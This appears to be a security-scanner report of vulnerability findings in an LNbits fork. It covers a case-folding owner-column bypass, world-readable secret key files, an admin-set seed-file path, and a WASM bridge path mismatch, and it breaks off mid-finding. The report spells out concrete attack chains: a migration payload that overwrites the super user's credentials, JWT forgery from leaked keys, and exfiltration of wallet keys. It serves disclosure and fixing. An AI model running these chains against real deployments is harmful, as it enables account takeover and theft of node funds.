**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257528

---

# Case-sensitive reserved owner-column check bypassed by Postgres identifier folding enables core-table writes

## Details
The WASM storage layer's only defence of its ownership column is a reserved-name check, and that check is a case-sensitive string comparison against `__lnbits_owner_id__` (crud.py:316, 336, 351, 427, 568). Identifiers are interpolated into SQL unquoted (crud.py:341-344, 377, 688) after passing a regex that admits mixed case (crud.py:20, 672-676). PostgreSQL (and CockroachDB) fold unquoted identifiers to lowercase, so a migration operation `{"op":"add_field","table":"accounts","field":"__LNBITS_OWNER_ID__","type":"string","default":"<value>"}` passes `_add_field_sql` and executes `ALTER TABLE <schema>.accounts ADD COLUMN __LNBITS_OWNER_ID__ TEXT NOT NULL DEFAULT '<value>'`, i.e. it creates — and stamps every existing row of — the real owner column. Nothing in the install path inspects storage migrations or schema.json for reserved names (validate_wasm_extension_permissions only checks public-append policies, api/permissions.py:375); `install_extension` runs the migration unconditionally (services/extensions.py:233-234).

On the extension's own tables this only produces a duplicate-column error, but combined with the schema collision recorded as `wasm-extension-id-public-collides-with-core-schema` (extension id `public` on PostgreSQL; `Database('ext_public')` addresses the core schema, db.py:312-337) it converts that read-only exposure into a write primitive. The answered lead lead-crud-306-25ab asked whether the owner-column requirement blocks writes to core tables: it does not, because the extension can add the column itself with a DEFAULT it controls.

Attack: the author publishes a WASM extension with id `public` whose `storage/migrations/001_x.json` adds `__LNBITS_OWNER_ID__` to `accounts` with DEFAULT equal to either `sha256(<author's self-registered user id>)` — exactly the owner id `ExtensionHostAPI` derives (host.py:93) — or the deterministic `extension:public` used for extension-scope scheduled jobs (wasm/scheduler.py:69). `storage/schema.json` declares table `accounts` with fields `id`, `username`, `password_hash`, `two_factor` (nullable). After the admin installs it on a PostgreSQL deployment, the module obtains the super-user id through the already-recorded read primitive (`storage.get_public('system_settings', id='super_user')`) or by listing accounts via a marker column, then calls `storage.set('accounts', {id: <super_user_id>, username: <chosen>, password_hash: <bcrypt of a known password>, two_factor: null})`. `storage_set_row` (crud.py:72-111) runs `INSERT INTO public.accounts AS storage_row (id, username, password_hash, two_factor, __lnbits_owner_id__) VALUES (...) ON CONFLICT (id) DO UPDATE SET username = excluded.username, password_hash = excluded.password_hash, two_factor = excluded.two_factor WHERE storage_row.__lnbits_owner_id__ = :owner`; the WHERE matches the stamped DEFAULT, `accounts` has no other NOT NULL columns (migrations.py:26-30 and all later ALTERs), and the super user's credentials are replaced. Login (`get_account_by_username_or_email` + bcrypt `verify_password`, auth_api.py:148-163) then succeeds with the attacker's password; with `two_factor` nulled no TOTP secret exists. The same upsert reaches `system_settings` (id PRIMARY KEY, `tag` defaulted, migrations.py:622-628), e.g. `lnbits_admin_users` or funding credentials, effective when settings are next loaded from the DB.

`wallets` is incidentally protected because its NOT NULL `"user"` column is a reserved word that cannot appear unquoted in the generated INSERT list (PostgreSQL evaluates NOT NULL constraints before the ON CONFLICT arbiter), and `apipayments` lacks a unique `id`; account takeover of the super user yields the same outcome through the admin UI.

Secondary (any id, PostgreSQL): declaring `__LNBITS_OWNER_ID__` in schema.json lets `filters`/`search_fields`/`sort_by` operate on the owner column in public paginated reads, an oracle over owner hashes; `_row_from_db` does not return it and `storage.set` with it errors, so this part is low impact.

Assumed dependency behaviour: PostgreSQL case-folds unquoted identifiers (documented SQL behaviour); asyncpg/SQLAlchemy as pinned pass the DDL through unchanged (rewrite_query only touches `%` and `?`).

Fix: compare reserved names case-insensitively (or reject any identifier whose lowercase form matches), quote generated identifiers so the database sees exactly the validated spelling, and reject reserved schema names at install.

## Evidence
1. [lnbits/core/wasm\_ext/storage/crud.py:333–344](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/storage/crud.py#L333-L344)
   _add_field_sql rejects the reserved owner column only with the case-sensitive `field['name'] == OWNER_ID_FIELD`, then emits `ALTER TABLE <schema>.<table> ADD COLUMN <name> ...` with the identifier unquoted. PostgreSQL folds unquoted identifiers to lowercase, so `__LNBITS_OWNER_ID__` passes the check and creates the real `__lnbits_owner_id__` column.
2. [lnbits/core/wasm\_ext/storage/crud.py:369–387](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/storage/crud.py#L369-L387)
   _column_sql appends NOT NULL and an author-chosen `DEFAULT '<value>'` (via _default_sql), so the ADD COLUMN stamps every pre-existing row of the target table with an owner id of the author's choosing.
3. [lnbits/core/wasm\_ext/storage/crud.py:72–111](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/storage/crud.py#L72-L111)
   storage_set_row upserts `INSERT INTO <schema>.<table> AS storage_row (...) ON CONFLICT (id) DO UPDATE SET <declared cols> = excluded.<col> WHERE storage_row.__lnbits_owner_id__ = :owner`. Once existing rows carry the stamped DEFAULT, the module's owner id satisfies the WHERE and any declared column of any existing row is overwritten.
4. [lnbits/core/wasm\_ext/storage/crud.py:672–676](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/storage/crud.py#L672-L676)
   _require_identifier accepts mixed-case identifiers (^[A-Za-z_][A-Za-z0-9_]*$); nothing lower-cases or quotes them before interpolation, so the validated spelling and the spelling the database resolves differ.
5. [lnbits/core/wasm\_ext/storage/crud.py:408–432](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/storage/crud.py#L408-L432)
   _load_table_schema applies the same case-sensitive comparison to schema.json field names and trusts the extension-authored schema.json for any table name, so the module can declare core table `accounts` with fields id/username/password_hash/two_factor and (secondary) declare `__LNBITS_OWNER_ID__` as an ordinary field for filter/search/sort oracles.
6. [lnbits/core/wasm\_ext/api/host.py:216–234](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/api/host.py#L216-L234)
   storage.set requires only the module's declared `ext.storage.write` permission and an owner context (require_auth: user page context or event/schedule context); it passes self.owner_id straight to storage_set_row.
7. [lnbits/core/wasm\_ext/api/host.py:93](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/api/host.py#L93)
   owner_id = sha256s(user_id): the extension author can precompute the owner id of their own (self-registered) account on the target and bake it into the migration DEFAULT.
8. [lnbits/core/wasm\_ext/wasm/scheduler.py:69](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/wasm/scheduler.py#L69)
   Extension-wide schedules run with the deterministic owner id `extension:<id>` and context 'schedule' (authenticated per has_authenticated_context), an alternative predictable DEFAULT that needs no account on the target.
9. [lnbits/db.py:312–337](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/db.py#L312-L337)
   Database('ext_public') maps to schema `public` and `CREATE SCHEMA IF NOT EXISTS public` is a no-op, so the ALTER/UPSERT above address the core tables (precondition established by verified finding wasm-extension-id-public-collides-with-core-schema).
10. [lnbits/core/migrations.py:26–30](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/migrations.py#L26-L30)
   accounts has `id TEXT PRIMARY KEY`; every later column (username, extra, created_at/updated_at with defaults, pubkey, access_control_list, external_id, ui_customization, activated DEFAULT true, two_factor; password_hash renamed at :535) is nullable or defaulted, so the upsert's INSERT passes NOT NULL checks and `ON CONFLICT (id) DO UPDATE SET password_hash = ...` succeeds against any account row.

## Impact
Overwriting any account row — including the super user's password_hash, username and two_factor — gives full administrative control: all wallets' keys and funds, all settings and secrets (confidentiality and integrity HIGH); the super user can disable the instance, drop extension DBs or delete data (availability HIGH). Subsequent-system impact: Super-user access exposes and lets the attacker change the funding-source credentials (macaroons, runes, API tokens) stored in settings, reaching the operator's Lightning node or custodial account outside LNbits.

## Reproduction steps
1. Attacker publishes a WASM extension with id `public` whose storage migration adds the mis-cased owner column with a precomputed DEFAULT to `accounts`. The admin installs it (conscious action, UI:ACTIVE) on a PostgreSQL/CockroachDB deployment, the documented at-scale backend (AT:PRESENT). The author then triggers `storage.set` either by opening the extension page as a self-registered user (registration open by default) or through an extension-scope scheduled job with owner `extension:public`; neither needs LNbits privileges (PR:NONE). The module's ordinary, permission-granted `ext.storage.write` call rewrites the super user's password hash and clears 2FA; no security mechanism beyond the admin's install decision stands in the way (AC:LOW, AV:NETWORK).

## Recommended fix
1. Reserved-column checks in _create_table_sql, _add_field_sql, _create_index_sql, _load_table_schema and _reject_reserved_owner_field compare case-sensitively while identifiers reach PostgreSQL unquoted and are case-folded, so a differently-cased name addresses the protected owner column. Fix criteria: Any identifier whose case-folded form equals the reserved owner column (and any name not matching a strict lowercase identifier grammar) must be rejected in migrations, schema.json, data and filters; generated DDL/DML should quote identifiers so the database sees exactly the validated name. Verify an add_field of `__LNBITS_OWNER_ID__` is refused and that storage.set cannot update a row whose owner differs.
2. The storage layer trusts that `Database(f'ext_{ext_id}')` is a private namespace; ids colliding with the core schema (`public`) make its DDL and upserts operate on core tables (see wasm-extension-id-public-collides-with-core-schema). Fix criteria: Install must refuse extension ids equal to reserved or existing schema names (`public`, `main`, `temp`, core table names), and migration DDL must only touch tables the extension itself created. Verify installing a WASM extension with id `public` fails on PostgreSQL.

---
**Severity:** HIGH
**Status:** Open
**Category:** Encoding confusion
**CWE:** [CWE-178](https://cwe.mitre.org/data/definitions/178.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257525

---

# JWT signing secret, TOTP key and super-user id files are created with default umask (world-readable)

## Details
On first start `settings.check_auth_secret_key()` and `settings.check_totp_encryption_key()` (lnbits/settings.py:1202-1228) create `.lnbits_auth_key` and `.lnbits_totp_key` in `LNBITS_DATA_FOLDER` with plain `open(path, "w+")`, and `services/users.py:180-181` writes the super-user id to `.super_user` with `open(path, "w")` on every start. No `os.open` mode, `os.chmod` or umask adjustment is applied anywhere in `lnbits/` (no `umask`/`chmod` call exists), so the files take the process default — 0644 under the usual 022 umask — inside a data folder created by `os.mkdir`/`Path.mkdir` with default mode 0755.

`auth_secret_key` is the HS256 secret that signs and verifies every session and ACL JWT (`helpers.create_access_token`, `decorators._decode_access_token`), the Starlette `SessionMiddleware` secret (`app.py:209`) and the AES key behind password-reset keys (`helpers.encrypt_internal_message`, `auth_api.reset_password`). The threat model records the super-user id as a credential. A local account on the same host that can traverse the data directory therefore reads `.lnbits_auth_key` and `.super_user` and mints a super-user bearer/cookie token — exactly the computation the project's own CLI performs in `commands._admin_auth_headers` (`AccessTokenPayload(sub="", usr=super_user)` signed with the key) — or forges a `reset_key_` for the super user and sets a new password. Either yields full control: every account and wallet, every admin setting including funding-source credentials, and Python extension install (code execution as the service user). `.lnbits_totp_key` lets the same reader decrypt every stored TOTP seed and defeat 2FA.

The condition under which this holds is a host with other unprivileged local accounts or co-located services and a data folder whose ancestors are traversable by them. The repository's own deployment units settle that this layout is shipped: the documented systemd unit (docs/guide/installation.md:695-700) runs as `User=lnbits` with the data folder under `/home/lnbits/lnbits/data` and sets no `UMask=`; the documented Docker invocation bind-mounts `${PWD}/data`, leaving root-owned 0644 key files on the host. Only the NixOS module fences the directory (`nix/modules/lnbits-service.nix:91-94`, tmpfiles `0700`). The maintainers already treat key material in this folder as needing 0600 — `_save_key` for `.onchain_key` uses `mkstemp` and `docs/guide/admin_ui.md:55-56` promises owner-only permissions — so these three files are an inconsistency, not a design choice. On SQLite deployments `database.sqlite3` in the same folder is also 0644 (same root cause), but on PostgreSQL deployments these key files are the only secret material on disk, and in both cases the auth key is the direct path to a forged super-user session and to code execution in the process.

## Evidence
1. [lnbits/settings.py:1202–1214](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L1202-L1214)
   check_auth_secret_key creates the data folder with os.mkdir (default mode, 0755 under umask 022) and writes the freshly generated auth_secret_key (uuid4().hex) to <data>/.lnbits_auth_key with open(path, 'w+'): no os.open mode, chmod or umask adjustment, so the file is 0644 under the default umask. This key signs and verifies every HS256 session/ACL JWT (helpers.py:199, decorators.py:548), is the Starlette SessionMiddleware secret (app.py:209) and the AES key for password-reset keys (helpers.py:212, auth_api.py:563).
2. [lnbits/settings.py:1216–1228](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L1216-L1228)
   check_totp_encryption_key writes <data>/.lnbits_totp_key the same way (open 'w+', default umask); this key encrypts stored TOTP seeds, so a reader can decrypt every account's 2FA secret.
3. [lnbits/core/services/users.py:180–181](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/users.py#L180-L181)
   On every start with the admin UI enabled the super-user id is written to <data>/.super_user with open(..., 'w') (default umask, 0644). The id is the 'usr' claim needed to mint a super-user token.
4. [lnbits/commands.py:731–746](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/commands.py#L731-L746)
   _admin_auth_headers shows the exact computation the reader performs: AccessTokenPayload(sub='', usr=<super_user id>) signed with settings.auth_secret_key via create_access_token is accepted as a super-user Bearer token by _get_account_from_jwt_payload (decorators.py:558-563: usr branch resolves get_account(usr)). Default mfa_revision '' matches an account without 2FA configured.
5. [lnbits/core/services/onchain.py:513–517](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/onchain.py#L513-L517)
   Contrast: the sibling secret .onchain_key is written via tempfile.mkstemp (0600) with the docstring 'Publish a complete mode-0600 file', and docs/guide/admin_ui.md:55-56 promises owner-only permissions. The auth, TOTP and super-user files fail the property the project itself applies to key material in the same folder.
6. [docs/guide/installation.md:695–699](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/docs/guide/installation.md#L695-L699)
   Documented systemd deployment: WorkingDirectory=/home/lnbits/lnbits, User=lnbits, no UMask= — the data folder is ./data under the service account's home, so other local accounts can read the three files wherever the home/data path is traversable. The documented Docker run (installation.md:307-310) bind-mounts ${PWD}/data, leaving root-owned 0644 key files on the host. Only the NixOS module (nix/modules/lnbits-service.nix:91-94, tmpfiles 0700) fences the directory.

## Impact
A forged super-user session gives full read/write control of every account, wallet and admin setting, discloses funding-source and provider credentials via the admin settings API, and allows Python extension installation, i.e. code execution as the LNbits service user; the TOTP key decrypts every stored 2FA seed. Availability follows from the ability to change the funding source, deactivate users or reset settings.

## Reproduction steps
1. The attacker is an unprivileged local user, or a compromised co-located service, on a host where LNbits runs under its own account with the default umask and a traversable data path — the layout produced by the documented systemd unit and the documented Docker bind mount, but not by the NixOS module (AT:P for that deployment condition). They read <data>/.lnbits_auth_key and <data>/.super_user, sign an HS256 JWT with usr=<super_user id> (the computation in commands._admin_auth_headers), and present it as Bearer or cookie; an account without 2FA passes check_two_factor_session with the default mfa_revision. No user interaction and no exploitation complexity beyond that.

## Recommended fix
Secret files (.lnbits_auth_key, .lnbits_totp_key, .super_user) are created with the process default umask instead of owner-only permissions, and the data folder is created with default mode. Fix criteria: All secret files in the data folder are created atomically with mode 0600 (os.open with O_CREAT|O_EXCL and 0o600, or the mkstemp pattern already used for .onchain_key), the data folder is created 0700, and existing files or directories with broader modes are tightened or warned about at startup; after a fresh start the three files are 0600 and the data directory is not group/world-readable.

---
**Severity:** HIGH
**Status:** Open
**Category:** Incorrect permission assignment
**CWE:** [CWE-732](https://cwe.mitre.org/data/definitions/732.html)
**Attack vector:** LOCAL
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257523

---

# Admin-settable phoenixd_data_dir makes LNbits read any seed.dat into admin-readable settings

## Details
PhoenixdWallet.__init__ (lnbits/wallets/phoenixd.py:72) calls _load_mnemonic_from_seed_file(), which takes the runtime-editable setting phoenixd_data_dir verbatim, builds Path(data_dir).expanduser() / 'seed.dat', reads the file and, if the content passes embit's mnemonic_is_valid, stores it in settings.phoenixd_mnemonic. The first status() call (phoenixd.py:81, reached unconditionally from check_funding_source at app.py:119 before any network I/O) persists it to system_settings via set_settings_field('phoenixd_mnemonic', ...). Nothing restricts the directory to the LNbits data folder, to the phoenixd instance LNbits talks to, or to a value set by the operator.

phoenixd_data_dir sits in PhoenixdFundingSource -> FundingSourcesSettings -> EditableSettings -> UpdateSettings (settings.py:637, 792-818, 1096-1154), so PUT and PATCH /admin/api/v1/settings (admin_api.py:103-140, 224-234), guarded only by check_admin, let any non-super admin write it; the project's own docs reserve funding-source control for the super user (docs/guide/super_user.md:61, user_roles.md:36). At the next process start check_admin_settings applies the DB value over the environment (core/services/users.py:166-179), the wallet reads the file, status() persists the words, and GET /admin/api/v1/settings (admin_api.py:95-101; get_admin_settings in core/crud/settings.py:35-49 withholds nothing per role) returns phoenixd_mnemonic to every admin; the admin funding form renders it (templates/components/admin/funding_sources.vue:81).

Quietest path: the operator already runs PhoenixdWallet (the default endpoint http://localhost:9740/ puts phoenixd on the same host) without PHOENIXD_DATA_DIR set. The admin writes only phoenixd_data_dir='~/.phoenix' (phoenixd's default data dir; expanduser resolves '~' to the LNbits process's home) and waits for a routine restart; no funding-source change is needed. Alternatively the admin also sets lnbits_backend_wallet_class=PhoenixdWallet with any non-empty endpoint/password, since the constructor does no network I/O. The desktop bundle (.github/packaging/funding.py:154-173, README.md:23-25) shows phoenixd's seed.dat holds the 12-word BIP39 mnemonic and places it, and the spark seed.dat, under the LNbits data folder, so both sidecar seeds are readable targets there.

Effect: a constrained server-side file read (fixed basename, BIP39-valid content) that copies any wallet seed the LNbits process can read into admin-readable settings. A seed is durable, LNbits-independent control over every sat the node holds, surviving API-password rotation or admin removal, and the project's trust model excludes admins from funding-source control. The finding holds where phoenixd (or another seed.dat) is on a filesystem the LNbits process can read; in a Docker split deployment with phoenixd in another container the target file is absent. The verified record admin-settings-get-discloses-funding-and-provider-secrets covers reading secrets already in the settings table; this finding adds the source: an admin-chosen filesystem path whose content is copied into that table.

## Evidence
1. [lnbits/wallets/phoenixd.py:424–453](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/phoenixd.py#L424-L453)
   _load_mnemonic_from_seed_file() takes settings.phoenixd_data_dir verbatim, applies expanduser(), appends 'seed.dat', reads the file and, if the content is a valid BIP39 mnemonic, copies it into settings.phoenixd_mnemonic and queues it for persistence. The only gates are the fixed basename and BIP39 validity; the directory is entirely controlled by the setting, with no base-directory or operator-origin check.
2. [lnbits/wallets/phoenixd.py:455–468](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/phoenixd.py#L455-L468)
   _persist_loaded_mnemonic() writes the file content into system_settings via set_settings_field('phoenixd_mnemonic', ...), making it part of the persisted admin-readable settings.
3. [lnbits/wallets/phoenixd.py:70–81](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/phoenixd.py#L70-L81)
   The constructor performs no network I/O (any non-empty endpoint/password suffices) and calls the loader at :72; status() calls _persist_loaded_mnemonic() at :81 before its first HTTP request, so persistence happens even if the phoenixd endpoint is unreachable.
4. [lnbits/settings.py:634–639](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L634-L639)
   phoenixd_data_dir and phoenixd_mnemonic are plain str fields of PhoenixdFundingSource, mixed into FundingSourcesSettings (:792-818, with lnbits_backend_wallet_class at :817) and EditableSettings/UpdateSettings (:1096-1154); nothing marks them super-user-only or read-only.
5. [lnbits/core/views/admin\_api.py:103–139](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L103-L139)
   api_update_settings is guarded only by check_admin; the sole per-field super-user check is for lnbits_allow_onchain_payments, so a non-super admin can persist phoenixd_data_dir (and lnbits_backend_wallet_class). The PATCH variant (:224-234) reaches the same handler.
6. [lnbits/core/services/users.py:166–178](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/users.py#L166-L178)
   At startup check_admin_settings applies the DB-stored admin settings over the environment (update_cached_settings), so the admin-written phoenixd_data_dir is the value PhoenixdWallet.__init__ sees.
7. [lnbits/app.py:112–119](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/app.py#L112-L119)
   set_funding_source() instantiates the stored wallet class at process start and check_funding_source() immediately calls status(), which persists the loaded mnemonic; the wallet is only built here, so the attack takes effect at the next restart (restart itself is super-user-only, admin_api.py:260-268).
8. [lnbits/core/views/admin\_api.py:95–100](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L95-L100)
   GET /admin/api/v1/settings returns the persisted settings, including phoenixd_mnemonic, to any admin; get_admin_settings (core/crud/settings.py:35-49) pops only super_user and auth_all_methods regardless of is_super_user. templates/components/admin/funding_sources.vue:81 renders the field in the admin form.
9. [.github/packaging/funding.py:154–173](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/packaging/funding.py#L154-L173)
   The shipped desktop launcher documents the target format and location: phoenixd's and spark's seed.dat each hold a BIP39 mnemonic (validated with mnemonic_is_valid, written 0o600) under <data>/funding/<provider>/, and PHOENIXD_DATA_DIR is wired to that directory (:223-228), confirming seed.dat files readable by the LNbits process exist in supported deployments.

## Impact
Confidentiality: a constrained file read (basename seed.dat, BIP39 content only) that discloses wallet seeds readable by the LNbits process to a role the project's docs exclude from funding-source control; a node seed is a top-tier secret (the threat model lists seeds among protected assets) giving durable, LNbits-independent control of all node funds, so C:H. No integrity or availability impact on LNbits itself. Subsequent-system impact: The disclosed BIP39 seed is the phoenixd (or spark) node's wallet identity: restored in another Phoenix instance it lets the admin observe all node payments and spend the entire pot outside LNbits, surviving API-password rotation. The project's own packaging README warns 'Never run two Phoenix instances with the same seed', so a competing instance also disrupts the operator's node (rated LOW as the disruption is not demonstrated from code).

## Reproduction steps
1. Attacker: an authenticated LNbits admin who is not the super user (lnbits_admin_users member with a password). Steps: (1) PUT or PATCH /admin/api/v1/settings with phoenixd_data_dir pointing at a directory holding a seed.dat (e.g. '~/.phoenix', or the desktop bundle's <data>/funding/spark) and, if the instance is not already on phoenixd, lnbits_backend_wallet_class=PhoenixdWallet with any non-empty endpoint/password; (2) wait for a routine process restart (restart from the UI is super-user-only, so this is a victim-state condition outside the attacker's control); (3) at startup the wallet reads the file and status() persists it; (4) GET /admin/api/v1/settings returns phoenixd_mnemonic. Requires a BIP39-valid seed.dat readable by the LNbits process at the chosen path, which the default localhost phoenixd endpoint and the desktop bundle make the ordinary case. No shipped control must be defeated, hence AC:L with AT:P.

## Recommended fix
1. A runtime-editable admin setting is used verbatim as a filesystem path and the file's content is copied into the persisted, admin-readable settings, turning a configuration field into a seed-file read primitive. Fix criteria: The seed-file import must not be driven by an admin-editable path: either accept the data dir only from the environment/read-only settings, or constrain it to a fixed location under the LNbits data folder and refuse paths outside it (after resolving symlinks and '~'). Verify by setting phoenixd_data_dir via the admin API as a non-super admin to a directory containing a valid seed.dat outside the data folder, restarting, and confirming phoenixd_mnemonic is not populated from it.
2. Funding-source settings, which the project's documentation reserves for the super user, are writable by any admin through PUT/PATCH /admin/api/v1/settings. Fix criteria: Writes to FundingSourcesSettings fields (including phoenixd_data_dir and lnbits_backend_wallet_class) must be rejected for non-super admins at the API, not only hidden in the UI. Verify that a non-super admin's PUT/PATCH containing phoenixd_data_dir returns 403 and leaves the stored value unchanged.
3. The imported mnemonic is persisted to system_settings, which every admin can read, rather than kept out of the admin-readable surface. Fix criteria: A mnemonic imported from disk should not be exposed through GET /admin/api/v1/settings to non-super-user admins (or should be stored only as a backup-confirmation flag, not the words). Verify that a non-super-user admin's settings response does not contain the mnemonic.

---
**Severity:** HIGH
**Status:** Open
**Category:** Path traversal
**CWE:** [CWE-73](https://cwe.mitre.org/data/definitions/73.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** HIGH
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** LOW
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257522

---

# WASM bridge validates root-relative API path but fetches document-relative, exposing wrapper page with wallet keys

## Details
The WASM extension UI runs in a sandboxed iframe (opaque origin, connect-src 'none') and may only reach the server through the parent bridge. The bridge's `api` action is the enforcement point: it should allow fetches only to the extension's own declared API routes (`/api/v1/ext/<id>/...`). The check and the request disagree on URL resolution.

`allowedApiRoute()` (wasm-extension-component.js:413-429) builds `new URL(path, window.location.origin)` — base is the origin root — and matches `url.pathname` against the route patterns. `callApi()` (:578) then calls `fetch(path, options)` with the raw string and `credentials: 'same-origin'`. Per the Fetch/URL specs a relative request URL is resolved against the document base URL (no `<base>` element exists in base.html), which for the wrapper page is `/ext/<id>` (base directory `/ext/`) or, after the allowed `navigation.replace` (:430-452, 1280-1287), any declared UI route under `/ext/<id>/`. So for `path = "api/v1/ext/myext/items/x"` the validator sees `/api/v1/ext/myext/items/x` (allowed) while fetch requests `/ext/api/v1/ext/myext/items/x` (or `/ext/myext/.../api/v1/ext/myext/items/x`) with the session cookie.

What lives there is attacker-chosen: UI routes are registered at `/ext{path}` with no restriction on `path` beyond a leading slash (routes/ui.py:332-337; WasmUIRouteConfig.path is a bare StrictStr), so the extension's config declares a UI route such as `/api/v1/ext/myext/items/{a}` (auth: user) alongside API route `GET /items/{a}`; no navigation step is even required. The wrapper handler (routes/ui.py:115-125, security.py:17-35) authenticates from the cookie via check_account_exists and renders `wasm_extension.html`, which extends base.html and embeds `JSON.parse({{ user | tojson | safe }})` (base.html:105) — the full User model with `wallets[].adminkey` and `wallets[].inkey` (models/wallets.py:119-124, users.py:289). `callApi` returns the HTML text to the frame verbatim (rememberPaymentHashes ignores strings).

The WASM host API never exposes wallet keys to a guest (api/models.py UserWalletSummary carries only id/name/currency), so this is a real escape: the frame moves the keys out through any normal extension channel — an `api` call to its own route so the module persists them in extension storage for later retrieval via a public route, `http.request` to its approved origin, or `websocket.send` to `/api/v1/ext/ws/<id>/<item>`. Holding the admin keys, the author pays invoices from all of the victim's wallets via the public `/api/v1/payments` API — bypassing every WASM permission (wallet.pay_invoice, background-payment prompts, max_amount) the admin and user believed constrained the extension.

Root cause: the reference is validated after resolution against one base (`new URL(path, origin)`) but dereferenced after resolution against another (`fetch(path)`), so the validated and the fetched resource differ for paths lacking a leading slash. The fetch must use the validated `url.href`, or `path` must be required to start with `/`.

## Evidence
1. [lnbits/static/js/wasm-extension-component.js:413–428](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/wasm-extension-component.js#L413-L428)
   allowedApiRoute() resolves the frame-supplied path with `new URL(path, window.location.origin)` (base = origin root) and tests the resulting pathname against the extension's /api/v1/ext/<id>/... patterns. For a path without a leading slash this yields `/api/v1/ext/<id>/...`.
2. [lnbits/static/js/wasm-extension-component.js:561–595](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/wasm-extension-component.js#L561-L595)
   callApi() then calls `fetch(path, options)` with the ORIGINAL string and credentials:'same-origin'. fetch() resolves a relative string against the document base URL (/ext/<id>/...), not the origin root, so the request goes to `/ext/<id>/api/v1/ext/<id>/...` — a different resource from the one validated. The response text is returned verbatim to the sandboxed frame.
3. [lnbits/static/js/wasm-extension-component.js:430–451](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/wasm-extension-component.js#L430-L451)
